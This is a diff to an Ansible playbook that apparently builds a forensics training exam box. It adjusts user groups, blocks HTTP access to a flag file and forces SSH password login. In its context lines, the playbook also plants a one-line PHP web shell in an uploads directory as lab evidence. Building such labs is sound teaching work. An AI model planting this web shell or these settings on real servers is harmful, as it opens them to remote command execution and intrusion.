@@ -15,7 +15,7 @@
     shell: /bin/bash
     home: /home/analyst
     create_home: true
-    groups: [sudo]
+    groups: [adm]
     append: true
 
 - name: evidence dir + capture
@@ -43,6 +43,16 @@
     dest: /var/www/html/uploads/shell.phtml
     content: "<?php system($_GET['c']); ?>\n"
     mode: "0644"
+
+- name: flag must be read on the box — only flag.txt is denied over HTTP
+  ansible.builtin.blockinfile:
+    path: /etc/apache2/apache2.conf
+    marker: "# {mark} PENTRAIN FOR-T3-EXAM FLAG DENY"
+    block: |
+      <LocationMatch "^/uploads/flag\.txt">
+        Require all denied
+      </LocationMatch>
+  notify: restart apache2
 
 - name: access.log — the attack timeline, ends with the db jump
   ansible.builtin.copy:
@@ -76,4 +86,11 @@
     path: /etc/ssh/sshd_config
     regexp: "^#?PasswordAuthentication"
     line: "PasswordAuthentication yes"
+  notify: restart sshd
+
+- name: sshd_config.d drop-in wins over cloud-image defaults
+  ansible.builtin.copy:
+    dest: /etc/ssh/sshd_config.d/00-pentrain-password.conf
+    content: "PasswordAuthentication yes\n"
+    mode: "0644"
   notify: restart sshd
